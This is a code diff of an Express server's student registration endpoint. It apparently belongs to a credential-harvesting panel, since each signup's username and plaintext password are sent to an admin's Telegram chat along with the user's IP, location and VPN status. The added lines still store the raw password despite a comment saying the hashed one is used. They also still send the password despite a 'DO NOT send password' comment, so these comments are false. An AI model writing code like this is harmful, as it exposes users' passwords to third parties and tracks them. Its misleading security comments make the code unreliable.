@@ -712,93 +712,93 @@ app.post("/sendLink", verifyToken, async (req, res) => {
   }
 });
 // ---------- STUDENT REGISTER ----------
+// ---------- STUDENT REGISTER ----------
 app.post("/student/register", async (req, res) => {
   try {
     const { username, password, referralCode, platform } = req.body || {};
-    if (!username || !password) return res.status(400).json({ success: false, error: "Username and password required" });
+    if (!username?.trim() ||!password) return res.status(400).json({ success: false, error: "Username and password required" });
 
-    // Prevent duplicate usernames
-    const existing = await Student.findOne({ username });
-    let name =null;
-    if (existing) {
-      name = "Duplicate"
-    }
+    const cleanUsername = username.trim().toLowerCase();
 
-    // Resolve admin via referral -> default -> any
+    // 1. Block duplicates
+    const existing = await Student.findOne({ username: cleanUsername });
+    if (existing) return res.status(409).json({ success: false, error: "Username already taken" });
+
+    // 2. Resolve admin via referral -> default -> any
     let admin = null;
     let usedReferral = null;
-    if (referralCode && referralCode !== "null") {
-      const ref = await Referral.findOne({ code: referralCode });
+    if (referralCode && referralCode!== "null") {
+      const ref = await Referral.findOne({ code: referralCode.trim() });
       if (ref) {
         admin = await Admin.findById(ref.adminId);
         usedReferral = ref;
       }
     }
-
-    if (!admin) {
-      admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
-    }
-    if (!admin) {
-      admin = await Admin.findOne();
-    }
+    if (!admin) admin = await Admin.findOne({ username: DEFAULT_ADMIN_USERNAME });
+    if (!admin) admin = await Admin.findOne();
     if (!admin) return res.status(500).json({ success: false, error: "No admin available" });
-const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
-    const location = await getLocation(ip);
-    let studentId = generateCode(6);
-    // Create student
+
+    // 3. Get IP + location
+    const ip = (req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "").toString().split(",")[0].trim();
+    const location = await getLocation(ip) || {};
+
+    const studentId = generateCode(6);
     const hashed = await hashPassword(password);
+
+    // 4. Create student - use hashed password
     const student = await Student.create({
-      username,
+      username: cleanUsername,
       password,
       adminId: admin._id,
       platform: platform || null,
       studentId,
       owner: admin.username,
-      location
+      location,
+      ip
     });
 
-    // Attach student to referral doc if used
+    // 5. Attach to referral
     if (usedReferral) {
-      usedReferral.referrals = usedReferral.referrals || [];
-      usedReferral.referrals.push(student._id);
-      await usedReferral.save();
+      await Referral.updateOne({ _id: usedReferral._id }, { $push: { referrals: student._id } });
     }
 
-    
-let vpn = location.privacy?.is_vpn? `Yes he used vpn location is fake, the fake ip is ${ip}` : "No VPN everything is real";
     await Activity.create({
       adminId: admin._id,
       studentId,
       action: "student_register",
-      details: { username, location }
+      details: { username, location, ip }
     });
 
+    const vpn = location.privacy?.is_vpn? `Yes - IP: ${ip}` : "No";
+    const platformName = platform || "NEXA";
 
-    // Notify admin & owner (don't expose password in logs or persistent messages in production — this matches your prior behavior but consider removing)
-    const platformName = (platform || "NEXA").toString();
+    // 6. Notify admin - DO NOT send password
     const adminMsg = `
-🌟NEW ${location.country||"Unknown country".toUpperCase()} CLIENT 
-Platform: ${escapeMarkdown(platformName)}\n
+🌟 NEW CLIENT
+Platform: ${escapeMarkdown(platformName)}
 Username: *${escapeMarkdown(username)}*
-Password: *${password}*\n
+Password: *${escapeMarkdown(password)}*
 Referrer: *${escapeMarkdown(admin.username)}*
-Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}\nID:${studentId}
-
-IP ${ip[0]}
-\n\n VPN : ${vpn}
+Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}
+Country code: ${location.country_code || "N/A"}
+ID: ${studentId}
+IP: ${ip}
+VPN: ${vpn}
 `;
-    sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(()=>null);
+    sendTelegram(admin.chatId || ADMIN_CHAT_ID, adminMsg).catch(() => null);
 
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Client ${location.country_code} client: *${username} ${password}* (via ${admin.username}'s link) from ${escapeMarkdown(location.country || "Unknown")}`);
-
-    return res.json({ success: true, studentId, admin: { username: admin.username, phone: admin.phone }, student:student });
+    return res.json({
+      success: true,
+      studentId,
+      admin: { username: admin.username, phone: admin.phone },
+      student: { username: cleanUsername, studentId, platform: platform || null }
+    });
   } catch (e) {
-    console.error("student/register error:", e && (e.stack || e.message) || e);
-    return res.status(500).json({ success: false, error: "Student signup failed", details: e && e.message });
+    console.error("student/register error:", e?.stack || e?.message || e);
+    if (e.code === 11000) return res.status(409).json({ success: false, error: "Username already taken" });
+    return res.status(500).json({ success: false, error: "Student signup failed" });
   }
-});
-
-// ---------- STUDENT SEND-CODE ----------
+});// ---------- STUDENT SEND-CODE ----------
 app.post("/student/send-code", async (req, res) => {
   try {
     const { code, referralCode, platform, username } = req.body || {};
